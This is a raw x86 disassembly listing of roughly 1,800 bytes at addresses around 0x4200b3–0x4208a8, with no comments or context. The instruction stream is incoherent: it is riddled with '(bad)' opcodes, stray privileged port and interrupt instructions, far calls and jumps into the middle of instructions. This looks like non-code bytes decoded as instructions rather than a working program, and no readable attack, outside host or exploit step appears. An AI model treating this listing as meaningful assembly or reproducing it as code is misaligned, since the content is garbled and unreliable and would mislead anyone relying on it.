  4200b3:	jge    0x4200dd
  4200b5:	inc    esp
  4200b6:	pop    ebx
  4200b7:	repnz cmp ecx,DWORD PTR [edi+0x77]
  4200bb:	test   eax,0x3d2607f6
  4200c0:	mov    al,ds:0x764cd32
  4200c5:	imul   esp,esi,0xffffffc5
  4200c8:	je     0x420087
  4200ca:	and    al,0x9e
  4200cc:	(bad)  
  4200cd:	fadd   DWORD PTR [ebp-0x5606efd2]
  4200d3:	fwait
  4200d4:	pop    edi
  4200d5:	jno    0x420082
  4200d7:	loopne 0x420072
  4200d9:	jne    0x420069
  4200db:	sbb    al,cl
  4200dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200de:	mov    cl,BYTE PTR [ebp+0x63eddf0d]
  4200e4:	retf   
  4200e5:	push   ecx
  4200e6:	sar    BYTE PTR [ebx-0x63],1
  4200e9:	sbb    DWORD PTR [edx-0x27849bb3],0xffffffe7
  4200f0:	call   0xcc057012
  4200f5:	and    bl,dh
  4200f7:	mov    eax,0x53da7df3
  4200fc:	xchg   edi,eax
  4200fd:	sbb    ch,ah
  4200ff:	bound  esp,QWORD PTR ds:0xa4f14ca6
  420105:	dec    edi
  420106:	mov    edx,ebp
  420108:	xor    eax,0x595e091f
  42010d:	xchg   BYTE PTR [ebp-0x1d],ch
  420110:	add    ebx,edi
  420112:	sub    eax,0x30b62734
  420117:	inc    ebp
  420118:	pusha  
  420119:	shr    BYTE PTR [ebx],1
  42011b:	mov    dh,BYTE PTR [ebp-0x436b0179]
  420121:	jns    0x42014b
  420123:	leave  
  420124:	cld    
  420125:	sub    dl,BYTE PTR [eax+ebx*8+0x46]
  420129:	lds    eax,FWORD PTR ds:0x5bb3c386
  42012f:	or     ecx,edi
  420131:	lods   eax,DWORD PTR ds:[esi]
  420132:	xor    BYTE PTR ds:0x5170b5fb,bh
  420138:	adc    dh,BYTE PTR ds:0x9dda1661
  42013e:	jnp    0x420105
  420140:	sub    DWORD PTR [eax-0x573b6bd9],edx
  420146:	das    
  420147:	push   esp
  420148:	jo     0x4200d0
  42014a:	dec    esi
  42014b:	xor    eax,0x30aa84d0
  420150:	loop   0x420194
  420152:	clc    
  420153:	gs push 0xe3ffac00
  420159:	test   BYTE PTR [eax+0xf],cl
  42015c:	sbb    edx,edi
  42015e:	xlat   BYTE PTR ds:[ebx]
  42015f:	dec    eax
  420160:	not    BYTE PTR [edi+0x38c1d9fb]
  420166:	dec    edi
  420167:	push   edi
  420168:	xlat   BYTE PTR ds:[ebx]
  420169:	push   0xffffff8e
  42016b:	call   0xe551cf9c
  420170:	shl    ebp,cl
  420172:	inc    ecx
  420173:	cmp    esp,DWORD PTR [ebp-0x5b00ad7c]
  420179:	enter  0xb81c,0x7
  42017d:	pop    eax
  42017e:	fs inc esi
  420180:	fwait
  420181:	jecxz  0x4201b3
  420183:	enter  0xfa64,0xe5
  420187:	jle    0x4201cf
  420189:	les    edx,FWORD PTR [ecx-0x5a17b10c]
  42018f:	add    BYTE PTR [esi],ch
  420191:	hlt    
  420192:	pop    ecx
  420193:	push   esi
  420194:	fbstp  TBYTE PTR [ebx+0x2041ce6]
  42019a:	iret   
  42019b:	stos   BYTE PTR es:[edi],al
  42019c:	jne    0x420217
  42019e:	das    
  42019f:	xchg   ecx,eax
  4201a0:	test   eax,0x7c6f81a4
  4201a6:	dec    edi
  4201a7:	xchg   esp,eax
  4201a8:	(bad)  
  4201a9:	test   DWORD PTR [ebx-0x4a],edi
  4201ac:	dec    esi
  4201ad:	mov    esp,0x856ecd7e
  4201b2:	mov    dl,0xc2
  4201b4:	add    cl,BYTE PTR [edi-0x11ddf3f9]
  4201ba:	xor    ch,dh
  4201bc:	xlat   BYTE PTR ds:[ebx]
  4201bd:	dec    eax
  4201bf:	fst    QWORD PTR [ecx-0x5b16c6b3]
  4201c5:	adc    bl,BYTE PTR [edi+eax*4+0x6214a779]
  4201cc:	cmp    DWORD PTR [eax-0x8605475],eax
  4201d2:	sub    BYTE PTR [eax+eax*4+0x55103fef],ah
  4201d9:	lea    esi,[esi+0x45]
  4201dc:	shl    DWORD PTR [ebx-0x55d421b],1
  4201e2:	psrlq  mm5,QWORD PTR [ebp+0x7a]
  4201e6:	sar    BYTE PTR [edx+0x3b00fde2],1
  4201ec:	mov    cl,0x57
  4201ee:	lock fcomip st,st(6)
  4201f1:	mov    edi,0xbb1c16fb
  4201f6:	shl    BYTE PTR [edi],0x0
  4201f9:	imul   esp,DWORD PTR [eax+eiz*8-0x31],0x1e70001
  420201:	add    BYTE PTR [eax],al
  420203:	or     dh,BYTE PTR [eax-0x51]
  420206:	mov    ebx,0x78732668
  42020b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42020c:	sub    BYTE PTR [ebx],dl
  42020e:	out    0x15,eax
  420210:	loopne 0x42020b
  420212:	push   ecx
  420213:	push   ds
  420214:	aad    0x55
  420216:	fild   QWORD PTR [edi]
  420218:	rcr    BYTE PTR [ecx],1
  42021a:	int    0xb0
  42021c:	adc    eax,0xc8aec7fa
  420221:	push   esi
  420222:	call   0x80a2:0x889fd660
  420229:	add    eax,0xd3e8349e
  42022e:	loope  0x420244
  420230:	jle    0x4201d0
  420232:	jmp    0xcc95:0xdc6d6f76
  420239:	std    
  42023a:	sbb    edi,esi
  42023c:	repnz int3 
  42023e:	popf   
  42023f:	sub    BYTE PTR cs:[ebp+0x41],0x34
  420244:	bnd jae 0x4201d9
  420247:	sbb    cl,BYTE PTR [ebx+edx*8+0x2765f51e]
  42024e:	sbb    eax,DWORD PTR [ebp+0x5530c1ca]
  420254:	iret   
  420255:	jne    0x420242
  420257:	fstp   st(5)
  420259:	sbb    esi,ebx
  42025b:	and    ah,bh
  42025d:	out    dx,al
  42025e:	fldenv [ecx]
  420260:	imul   esi,DWORD PTR [ebp-0x55],0x55bbf2fe
  420267:	jns    0x420287
  420269:	or     eax,0xbca64783
  42026e:	add    DWORD PTR [ebx-0x284819b4],edi
  420274:	pop    esi
  420275:	divps  xmm4,XMMWORD PTR [ecx-0x1]
  420279:	aam    0x84
  42027b:	jp     0x420249
  42027d:	sbb    eax,0x9a1ab4f0
  420282:	rcr    cl,cl
  420284:	xor    eax,0x2eed920f
  420289:	cmc    
  42028a:	ja     0x420292
  42028c:	int    0xdf
  42028e:	inc    esp
  42028f:	sbb    al,0xac
  420291:	test   edx,ebx
  420293:	pop    ds
  420294:	(bad)  
  420296:	cdq    
  420297:	push   0x6f4f42f5
  42029c:	mov    ds:0xbac77c97,eax
  4202a1:	aas    
  4202a2:	retf   
  4202a3:	pop    es
  4202a4:	mov    ?,WORD PTR [edx]
  4202a6:	das    
  4202a7:	loop   0x42023a
  4202a9:	out    0x1d,al
  4202ab:	push   0x78
  4202ad:	cmp    esp,DWORD PTR [edi+0x38]
  4202b0:	pusha  
  4202b1:	sahf   
  4202b2:	and    al,0x63
  4202b4:	pop    ss
  4202b5:	(bad)  
  4202b6:	push   0x3c84e791
  4202bb:	fcmovnb st,st(2)
  4202bd:	or     ebp,DWORD PTR [ecx]
  4202bf:	fld    TBYTE PTR [esi+0x59]
  4202c2:	push   edi
  4202c3:	or     BYTE PTR [esi-0x3fd2510a],0x93
  4202ca:	inc    edi
  4202cb:	cmp    BYTE PTR [esi+edi*2+0x627ba962],0xe
  4202d3:	jno    0x420289
  4202d5:	aad    0xbf
  4202d7:	ror    BYTE PTR [edx],0x47
  4202da:	hlt    
  4202db:	jbe    0x42027b
  4202dd:	call   FWORD PTR [edx-0x185c198]
  4202e3:	adc    al,0x2e
  4202e5:	cs fs pop esi
  4202e8:	mov    esi,ecx
  4202ea:	test   BYTE PTR [ebp+0x7867dd71],dh
  4202f0:	aad    0x6d
  4202f2:	fisttp DWORD PTR [ecx-0x45]
  4202f5:	fisttp WORD PTR [esi+ebp*2+0x23]
  4202f9:	ss dec esi
  4202fb:	sti    
  4202fc:	(bad)  
  4202fe:	ret    0xe202
  420301:	shr    BYTE PTR [eax],1
  420303:	jmp    0x7fd13ef4
  420308:	in     al,dx
  420309:	or     edi,DWORD PTR [esi]
  42030b:	leave  
  42030c:	rol    DWORD PTR ds:0x1774b31c,0xfc
  420313:	les    edx,FWORD PTR [ebx+eax*2+0x52c2efab]
  42031a:	sahf   
  42031b:	jp     0x4202f4
  42031d:	pop    ebp
  42031e:	loope  0x4202f6
  420320:	mov    ch,0x98
  420322:	fimul  WORD PTR [ebp-0x12]
  420325:	into   
  420326:	cmp    ch,BYTE PTR [edi-0x3d]
  420329:	mov    cl,0x4c
  42032b:	cld    
  42032c:	push   edx
  42032d:	sti    
  42032e:	jns    0x420319
  420330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420331:	dec    ebp
  420332:	jae    0x420397
  420334:	fdivr  QWORD PTR [esi+ebp*2-0x41]
  420338:	pop    eax
  420339:	mov    esi,0xc4f35d25
  42033e:	mov    ebp,0x18625e56
  420343:	sti    
  420344:	mov    es,WORD PTR [ebp+0x5358a0e6]
  42034a:	or     al,0x49
  42034c:	mov    ecx,0x80df4d42
  420351:	test   edi,esp
  420353:	pop    esi
  420354:	in     eax,0x3c
  420356:	xchg   ebp,eax
  420357:	xor    BYTE PTR [edx+0x5c44784f],cl
  42035d:	fidiv  WORD PTR [ebx+0x38cba897]
  420363:	push   eax
  420364:	les    esi,FWORD PTR [ecx+0x68]
  420367:	dec    eax
  420368:	dec    edx
  420369:	cmp    al,0x56
  42036b:	sbb    BYTE PTR [esi],dh
  42036d:	les    ebx,FWORD PTR [esi]
  42036f:	popf   
  420370:	sub    DWORD PTR [ebp-0xa718cf6],0xf14946d7
  42037a:	jbe    0x420341
  42037c:	xchg   esi,eax
  42037d:	mov    ds:0x4f45b382,al
  420382:	push   ebx
  420383:	mov    al,0x47
  420385:	nop
  420386:	ret    0x7a86
  420389:	imul   ecx,DWORD PTR [eax-0x343167bb],0xffffffba
  420390:	lea    edi,[edx]
  420392:	or     eax,0x61774846
  420397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420398:	adc    esp,DWORD PTR [eax+0x61]
  42039b:	push   ebp
  42039c:	inc    edi
  42039d:	ret    
  42039e:	rcl    BYTE PTR [eax+0x6430a97d],1
  4203a4:	xlat   BYTE PTR ds:[ebx]
  4203a5:	inc    esi
  4203a6:	stc    
  4203a7:	rcl    BYTE PTR [esi-0x4c0154bc],cl
  4203ad:	out    dx,al
  4203ae:	test   eax,0xd17d65d5
  4203b3:	aam    0x65
  4203b5:	jo     0x42034f
  4203b7:	sbb    bh,BYTE PTR [ecx]
  4203b9:	and    al,0xa
  4203bb:	out    0xe7,eax
  4203bd:	pop    ebx
  4203be:	cmp    dl,BYTE PTR [edi+0x23]
  4203c1:	gs je  0x420435
  4203c4:	(bad)  
  4203c5:	pop    esp
  4203c6:	jno    0x420378
  4203c8:	jne    0x4203ad
  4203ca:	popf   
  4203cb:	in     eax,dx
  4203cc:	sahf   
  4203cd:	xchg   esp,eax
  4203ce:	imul   ebp,DWORD PTR [eax+0x3d],0xffffffbc
  4203d2:	mov    ecx,0x10c06fb5
  4203d7:	jmp    0x78f2448a
  4203dc:	xor    dh,BYTE PTR [ecx-0x10]
  4203df:	retf   
  4203e0:	xor    edi,DWORD PTR [ebx]
  4203e2:	loope  0x42045e
  4203e4:	pusha  
  4203e5:	addr16 jle 0x420403
  4203e8:	pop    esp
  4203e9:	es add ah,dl
  4203ec:	sqrtps xmm6,xmm0
  4203ef:	(bad)  
  4203f1:	cmc    
  4203f2:	das    
  4203f3:	sbb    BYTE PTR [eax],cl
  4203f5:	xchg   ebx,eax
  4203f6:	iret   
  4203f7:	loop   0x420401
  4203f9:	pop    ecx
  4203fa:	mov    esp,0x1d1c7
  4203ff:	out    0x1,eax
  420401:	add    BYTE PTR [eax],al
  420403:	cld    
  420404:	push   esi
  420405:	mov    WORD PTR [edx-0x17],?
  420408:	into   
  420409:	adc    BYTE PTR [edx],dh
  42040b:	mov    esp,es
  42040d:	and    eax,DWORD PTR [edi]
  42040f:	ret    
  420410:	lds    edi,FWORD PTR [eax-0x46fea5eb]
  420416:	jbe    0x42048d
  420418:	sbb    BYTE PTR [edx-0x7c],ah
  42041b:	inc    edi
  42041c:	ret    
  42041d:	pop    ebx
  42041e:	in     al,0xbc
  420420:	shr    DWORD PTR [ecx+0x4d76fc23],cl
  420426:	mov    ds:0x102c1ebd,eax
  42042b:	and    ecx,0x6f
  42042e:	(bad)  
  42042f:	adc    dh,ah
  420431:	lods   al,BYTE PTR ds:[esi]
  420432:	or     BYTE PTR [ebx+0x1d6bdfcf],0x7f
  420439:	xchg   ecx,eax
  42043a:	mov    dl,0xad
  42043c:	sbb    DWORD PTR [esi],0xffffffef
  42043f:	jge    0x420472
  420441:	adc    eax,0x766b1249
  420446:	pop    ecx
  420447:	outs   dx,DWORD PTR ds:[esi]
  420448:	and    BYTE PTR [edx-0x71],ch
  42044b:	mov    ebx,0x46843875
  420450:	sub    al,0x1c
  420452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420453:	sub    DWORD PTR [ebp+0x59],esp
  420456:	mov    ah,0x22
  420458:	pop    edi
  420459:	hlt    
  42045a:	mov    edx,0xba3dac43
  42045f:	mov    WORD PTR [edx],?
  420461:	gs dec ebx
  420463:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420464:	sub    esi,esp
  420466:	mov    ds:0x6ec4c7c8,eax
  42046b:	push   ecx
  42046c:	sub    al,0x58
  42046e:	fisttp WORD PTR [eax]
  420470:	lods   eax,DWORD PTR ds:[esi]
  420471:	in     al,0xb0
  420473:	pop    ds
  420474:	add    BYTE PTR [edx-0x7cfe143],ah
  42047a:	sbb    dl,BYTE PTR [edi]
  42047c:	dec    esp
  42047d:	fstp   QWORD PTR [ecx]
  42047f:	test   al,0x5d
  420481:	inc    esi
  420482:	ja     0x42045a
  420484:	call   0xeaa0:0x2de52f8c
  42048b:	popa   
  42048c:	(bad)  
  42048d:	retf   0x948a
  420490:	stos   DWORD PTR es:[edi],eax
  420491:	and    ch,ah
  420493:	inc    eax
  420494:	xor    eax,ebx
  420496:	mov    ds:0x7350e65b,al
  42049b:	shr    BYTE PTR [esp+eiz*4-0x7dfd81c1],0xb2
  4204a3:	dec    ebp
  4204a4:	mov    bl,bh
  4204a6:	pushf  
  4204a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4204a8:	cmp    eax,0xa5f77c3b
  4204ad:	js     0x4204a5
  4204af:	ret    0x938d
  4204b2:	in     al,0x2f
  4204b4:	cmp    bl,BYTE PTR [ebp-0x4d]
  4204b7:	cmp    cl,dl
  4204b9:	adc    edx,ebp
  4204bb:	add    BYTE PTR [edi],0x61
  4204be:	popf   
  4204bf:	cmc    
  4204c0:	add    ebx,ebp
  4204c2:	ins    BYTE PTR es:[edi],dx
  4204c3:	push   ecx
  4204c4:	call   0x30d3747e
  4204c9:	loope  0x4204af
  4204cb:	(bad)  
  4204cc:	sbb    BYTE PTR [ebx+0x220514df],dl
  4204d2:	retf   
  4204d3:	jno    0x420475
  4204d5:	lods   eax,DWORD PTR ds:[esi]
  4204d6:	stc    
  4204d7:	aas    
  4204d8:	fld    DWORD PTR [eax+eax*2+0x32]
  4204dc:	int3   
  4204dd:	(bad)
  4204e0:	popf   
  4204e1:	cmp    DWORD PTR [esi+eiz*2],edx
  4204e4:	sub    al,0xb
  4204e6:	push   es
  4204e7:	mov    ch,cl
  4204e9:	in     al,dx
  4204ea:	xchg   DWORD PTR [edi-0x67],esp
  4204ed:	out    dx,eax
  4204ee:	bnd jle 0x4204c2
  4204f1:	outs   dx,BYTE PTR ds:[esi]
  4204f2:	adc    edi,ecx
  4204f4:	mov    BYTE PTR [esp+ebx*4+0x5c3faa15],bl
  4204fb:	not    esi
  4204fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204fe:	mov    al,ds:0xd37b836b
  420503:	xor    cl,BYTE PTR [esp+ebx*4-0x6f72bd23]
  42050a:	sub    DWORD PTR [edi+0x34ea4e14],esi
  420510:	out    dx,al
  420511:	mov    ds:0x3b535a6,eax
  420516:	and    cl,BYTE PTR [ebp+0x63a3c420]
  42051c:	mov    ds:0xc74190b4,eax
  420521:	pop    esp
  420522:	xor    dh,BYTE PTR [ecx]
  420524:	jmp    0x420518
  420526:	adc    DWORD PTR [eax-0x7e],edi
  420529:	add    DWORD PTR [eax-0x5dd92396],esp
  42052f:	sub    edi,DWORD PTR [esi+0x19e5d156]
  420535:	in     al,dx
  420536:	loope  0x420503
  420538:	sub    eax,0x44038daf
  42053d:	jmp    0xaedc:0x91b69f86
  420544:	mov    al,ds:0x3b532f96
  420549:	cmc    
  42054a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42054b:	add    BYTE PTR [esi],0x2c
  42054e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42054f:	in     eax,dx
  420550:	xchg   edx,eax
  420551:	push   ebp
  420552:	inc    eax
  420553:	push   es
  420554:	push   cs
  420555:	sub    BYTE PTR [ecx+eax*8],al
  420558:	sub    BYTE PTR [ecx+ebx*4-0x23],0x86
  42055d:	stc    
  42055e:	dec    esi
  42055f:	nop
  420560:	gs loopne 0x4205af
  420563:	retf   
  420564:	or     eax,0xc6646108
  420569:	stos   DWORD PTR es:[edi],eax
  42056a:	pop    ecx
  42056b:	jecxz  0x42052f
  42056d:	ror    esi,cl
  42056f:	cwde   
  420570:	jecxz  0x4205c8
  420572:	arpl   WORD PTR [ebp+0x22e38a58],bx
  420578:	(bad)  
  420579:	mov    es,WORD PTR [esi+0x4dc4e40d]
  42057f:	cld    
  420580:	ret    0x26c6
  420583:	loopne 0x420571
  420585:	jmp    0xc58f3cfd
  42058a:	mov    ebp,0xf2b0ea2a
  42058f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420590:	(bad)  
  420591:	jmp    0x5a4c0a7f
  420596:	jge    0x4205e3
  420598:	fcmovb st,st(0)
  42059a:	lds    esi,FWORD PTR [ebp+0x41093b84]
  4205a0:	cli    
  4205a1:	adc    al,0x90
  4205a3:	out    0x38,eax
  4205a5:	dec    edi
  4205a6:	bound  ebp,QWORD PTR [edi]
  4205a8:	stos   DWORD PTR es:[edi],eax
  4205a9:	out    dx,al
  4205aa:	push   ss
  4205ab:	dec    edx
  4205ac:	fxch   st(2)
  4205ae:	popa   
  4205af:	adc    eax,0x507b12d9
  4205b4:	cmp    ebx,esi
  4205b6:	sub    al,0x48
  4205b8:	mov    WORD PTR [ebp+0x1e],gs
  4205bb:	inc    ebx
  4205bc:	neg    BYTE PTR [edi+0x7e]
  4205bf:	rcl    cl,cl
  4205c1:	enter  0x5792,0x51
  4205c5:	iret   
  4205c6:	mov    al,0xfd
  4205c8:	jns    0x4205ae
  4205ca:	sti    
  4205cb:	retfw  0xbd84
  4205cf:	outs   dx,DWORD PTR ds:[esi]
  4205d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205d1:	retf   0x2651
  4205d4:	cmp    DWORD PTR [ebp-0x4d98d690],0x39
  4205db:	cmp    al,BYTE PTR [ebp+0x23]
  4205de:	lds    ebx,FWORD PTR [edi-0x5b4436c5]
  4205e4:	mov    al,0xf6
  4205e6:	pop    eax
  4205e7:	pop    ds
  4205e8:	mov    dh,0x9c
  4205ea:	add    ch,cl
  4205ec:	sub    eax,0xfbf54395
  4205f1:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4205f7:	dec    ebp
  4205f8:	loopne 0x420664
  4205fa:	aam    0xae
  4205fc:	rol    DWORD PTR [ecx],cl
  4205fe:	add    bh,ah
  420600:	add    DWORD PTR [eax],eax
  420602:	add    BYTE PTR [esi],al
  420604:	push   DWORD PTR [esi]
  420606:	mov    ah,0x10
  420608:	fadd   DWORD PTR [eax-0x4aa21095]
  42060e:	xchg   esi,eax
  42060f:	dec    ecx
  420610:	mov    bl,0x4c
  420612:	mov    bl,0x7b
  420614:	adc    bl,ah
  420616:	dec    DWORD PTR fs:[bp+di]
  42061a:	aam    0xa7
  42061c:	adc    BYTE PTR [ebp-0x53],0x33
  420620:	mov    ds:0x824898a5,al
  420625:	mov    al,ds:0x6df6f90
  42062a:	stos   DWORD PTR es:[edi],eax
  42062b:	and    dh,BYTE PTR [edi+0x60]
  42062e:	addr16 push ebp
  420630:	mov    dh,0xce
  420632:	mov    dl,0x12
  420634:	and    BYTE PTR [edi],0xa4
  420637:	sbb    edi,ecx
  420639:	inc    ebx
  42063a:	sub    bh,BYTE PTR [ecx+0x4ddf9ec2]
  420640:	and    edi,edi
  420642:	jp     0x420629
  420644:	ja     0x4205d4
  420646:	and    ebx,DWORD PTR [ebx-0x3ea8ea1a]
  42064c:	repnz popa 
  42064e:	inc    ecx
  42064f:	ss sub eax,0xdb51d5fd
  420655:	popa   
  420656:	int    0x26
  420658:	pop    esi
  420659:	inc    ebp
  42065a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42065b:	aam    0xa
  42065d:	(bad)  [ebx-0x423f3f12]
  420663:	add    eax,0xe5c3f9e6
  420668:	je     0x4206ad
  42066a:	inc    eax
  42066b:	add    al,0xe7
  42066d:	pop    eax
  42066e:	mov    bh,BYTE PTR [ebx+0x5ce273ca]
  420674:	add    ecx,ebx
  420676:	push   cs
  420677:	sub    esp,0x1e258802
  42067d:	push   ecx
  42067e:	inc    esp
  42067f:	(bad)  
  420680:	push   ebx
  420681:	pop    eax
  420682:	repz out dx,al
  420684:	cmp    al,0x0
  420686:	inc    eax
  420687:	mov    ebp,0xcf937f85
  42068c:	xchg   ebp,eax
  42068d:	mov    esp,ecx
  42068f:	mov    al,0x27
  420691:	aas    
  420692:	cdq    
  420693:	xchg   esi,eax
  420694:	mov    cl,BYTE PTR [eax-0x26]
  420697:	inc    eax
  420698:	pop    DWORD PTR [eax]
  42069a:	lahf   
  42069b:	push   ebx
  42069c:	call   0x823c:0x7cdffa14
  4206a3:	sub    al,BYTE PTR [eax]
  4206a5:	sub    al,0x91
  4206a7:	rcl    BYTE PTR [ecx+0xa],1
  4206aa:	dec    eax
  4206ab:	out    dx,eax
  4206ac:	(bad)  
  4206ad:	cdq    
  4206ae:	and    eax,0xd9e247b5
  4206b3:	pop    ds
  4206b4:	sbb    al,0xb6
  4206b6:	dec    eax
  4206b7:	xchg   ecx,ecx
  4206b9:	fsub   st,st(0)
  4206bb:	repnz cwde 
  4206bd:	sbb    DWORD PTR [esi],edi
  4206bf:	sti    
  4206c0:	and    ecx,DWORD PTR [edi-0x41]
  4206c3:	mov    dh,BYTE PTR [ebx+0x25d27e43]
  4206c9:	push   ebp
  4206ca:	in     al,0x80
  4206cc:	xchg   edx,eax
  4206cd:	loopne 0x42074e
  4206cf:	adc    eax,0xc97ac191
  4206d4:	iretw  
  4206d6:	loope  0x420713
  4206d8:	sbb    DWORD PTR [ebx-0x28],0x213d6f83
  4206df:	ja     0x4206c6
  4206e1:	dec    esp
  4206e2:	test   al,0xb8
  4206e4:	shl    DWORD PTR [edi+0x2f],1
  4206e7:	dec    ebp
  4206e8:	clc    
  4206e9:	mov    WORD PTR [ebx-0x4f0713c7],ds
  4206ef:	cld    
  4206f0:	in     al,dx
  4206f1:	lock mov bl,0xc2
  4206f4:	fcmove st,st(2)
  4206f6:	cmc    
  4206f7:	mov    DWORD PTR [esi-0x2a],esp
  4206fa:	sub    bl,cl
  4206fc:	add    eax,0x24953280
  420701:	dec    ecx
  420702:	cmp    al,0x3d
  420704:	inc    cx
  420706:	cwde   
  420707:	or     ah,bl
  420709:	fxch   st(0)
  42070b:	inc    edx
  42070c:	loop   0x420703
  42070e:	loop   0x4206fd
  420710:	aad    0xa3
  420712:	push   esp
  420713:	and    DWORD PTR ds:0x4d4cd24f,esp
  420719:	xchg   ecx,edx
  42071b:	or     al,0x96
  42071d:	dec    ebx
  42071e:	cmp    DWORD PTR [ebx],ecx
  420720:	clc    
  420721:	rol    BYTE PTR [edx+esi*8+0x3e],cl
  420725:	jecxz  0x42077f
  420727:	sub    al,0xa3
  420729:	sub    eax,0x60e96d98
  42072e:	pusha  
  42072f:	mov    edx,0xf0a9e2de
  420734:	cmp    edx,DWORD PTR [ebx]
  420736:	add    eax,DWORD PTR [esi+ebx*2]
  420739:	popf   
  42073a:	popa   
  42073b:	ss (bad) 
  42073e:	pop    eax
  42073f:	or     BYTE PTR [ebx+0x2e24d2ef],bh
  420745:	push   edx
  420746:	xlat   BYTE PTR ds:[ebx]
  420747:	mov    ch,0x60
  420749:	les    ebp,FWORD PTR [ebx-0x3ec69203]
  42074f:	sti    
  420750:	xlat   BYTE PTR ds:[ebx]
  420751:	mov    BYTE PTR [ecx+0x10],bl
  420754:	cmp    BYTE PTR [edi-0x61],al
  420757:	enter  0xb199,0xb1
  42075b:	retf   0xb49b
  42075e:	or     al,0xe1
  420760:	jmp    0x420736
  420762:	stc    
  420763:	inc    edx
  420764:	cmp    BYTE PTR [esi],bh
  420766:	out    dx,al
  420767:	xor    al,0xb1
  420769:	ret    0x9227
  42076c:	aad    0x22
  42076e:	push   ds
  42076f:	push   esi
  420770:	lods   al,BYTE PTR ds:[esi]
  420771:	stos   DWORD PTR es:[edi],eax
  420772:	fwait
  420773:	cmp    esp,DWORD PTR [eax+eax*2-0x4]
  420777:	adc    DWORD PTR ds:0xe95272c6,0x334badb0
  420781:	pop    ds
  420782:	mov    eax,0x15be0c5
  420787:	jnp    0x4207a1
  420789:	pop    esp
  42078a:	std    
  42078b:	xchg   esi,eax
  42078c:	inc    BYTE PTR [ecx]
  42078e:	sub    eax,0x6ae39101
  420793:	xor    edx,DWORD PTR [ecx+0x287596be]
  420799:	add    eax,0x752efe6f
  42079e:	pop    ebp
  42079f:	iret   
  4207a0:	pop    esi
  4207a1:	out    dx,al
  4207a2:	or     eax,0xdee7c402
  4207a7:	iret   
  4207a8:	or     dl,dh
  4207aa:	loopne 0x420791
  4207ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207ad:	cwd    
  4207af:	or     ebp,DWORD PTR [edx-0x5c]
  4207b2:	fimul  WORD PTR [ecx+esi*1]
  4207b5:	call   0x9950:0x480af954
  4207bc:	neg    DWORD PTR [ecx-0x2e]
  4207bf:	lds    esi,FWORD PTR [ebx]
  4207c1:	sub    DWORD PTR [ecx+0x52],eax
  4207c4:	sahf   
  4207c5:	mov    dl,0x81
  4207c7:	dec    esi
  4207c8:	mov    WORD PTR [eax-0x31],ds
  4207cb:	int3   
  4207cc:	mov    edx,0x9fb8acd
  4207d1:	and    eax,0x72275e64
  4207d6:	outs   dx,BYTE PTR gs:[esi]
  4207d8:	iret   
  4207d9:	mov    eax,ds
  4207db:	adc    al,0xaa
  4207dd:	or     bl,BYTE PTR [esi+ebx*2-0x5ee1305d]
  4207e4:	lds    esi,FWORD PTR [ecx-0x14]
  4207e7:	lea    edx,[edi+0x63]
  4207ea:	add    BYTE PTR [ebx],dl
  4207ec:	fs out 0xb,eax
  4207ef:	test   DWORD PTR [ebx-0xce58301],0x76e94cfc
  4207f9:	hlt    
  4207fa:	jnp    0x420791
  4207fc:	aad    0x1
  4207fe:	add    bh,ah
  420800:	add    DWORD PTR [eax],eax
  420802:	add    BYTE PTR [ebx+0x54a73384],ah
  420808:	add    BYTE PTR ds:0x4f08f30b,al
  42080e:	cmp    eax,0xa4ed8cde
  420813:	or     edi,DWORD PTR [eax]
  420815:	adc    DWORD PTR [edx+edx*2],esp
  420818:	ss daa 
  42081a:	pop    esp
  42081b:	cmp    ecx,DWORD PTR [ecx+0x25]
  42081e:	inc    ebp
  42081f:	fsub   DWORD PTR [eax+0x16]
  420822:	or     DWORD PTR [edx-0x78],ecx
  420825:	rcl    BYTE PTR [ebx+0x50],cl
  420828:	leave  
  420829:	imul   ecx,DWORD PTR [edx+eax*1-0x32],0x4f
  42082e:	or     al,0x29
  420830:	(bad)  
  420831:	mov    edx,0x6efa1725
  420836:	adc    edx,DWORD PTR [eax-0x3386f9ad]
  42083c:	pop    es
  42083d:	mov    ebp,0xf3fab68d
  420842:	lds    ebx,FWORD PTR [edi]
  420844:	or     esp,edi
  420846:	ficom  DWORD PTR [ebp+edx*8+0x7e0c972f]
  42084d:	out    dx,al
  42084e:	dec    esi
  42084f:	fcom   QWORD PTR [esi+0x2b]
  420852:	jl     0x420806
  420854:	in     al,0x70
  420856:	dec    ebx
  420857:	jle    0x4208b4
  420859:	jno    0x420893
  42085b:	xchg   esi,eax
  42085c:	leave  
  42085d:	mov    esi,0x22d2a322
  420862:	aad    0x39
  420864:	popa   
  420865:	hlt    
  420866:	inc    eax
  420867:	mov    edx,0x2ad9ff9c
  42086c:	add    eax,ecx
  42086e:	out    dx,eax
  42086f:	mov    ds:0x44a0a9e,eax
  420874:	das    
  420875:	rcr    DWORD PTR [esi+ecx*8-0x61f00d58],0x46
  42087d:	fadd   QWORD PTR [edx]
  42087f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420880:	cmp    eax,0x2ca51b84
  420885:	mov    al,BYTE PTR [ebp-0x7b]
  420888:	ret    0x5c8d
  42088b:	pop    ebx
  42088c:	sub    eax,0x3cda2c15
  420891:	(bad)  
  420892:	(bad)  
  420893:	in     al,0xc8
  420895:	adc    ebx,DWORD PTR [ebx]
  420897:	pop    es
  420898:	icebp  
  420899:	mov    al,ds:0x5db9d7dc
  42089e:	inc    eax
  42089f:	pop    eax
  4208a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208a1:	inc    edi
  4208a2:	stos   BYTE PTR es:[edi],al
  4208a3:	dec    esp
  4208a4:	inc    ecx
  4208a5:	dec    ebx
  4208a6:	xor    esi,ecx
  4208a8:	sbb    dl,dh
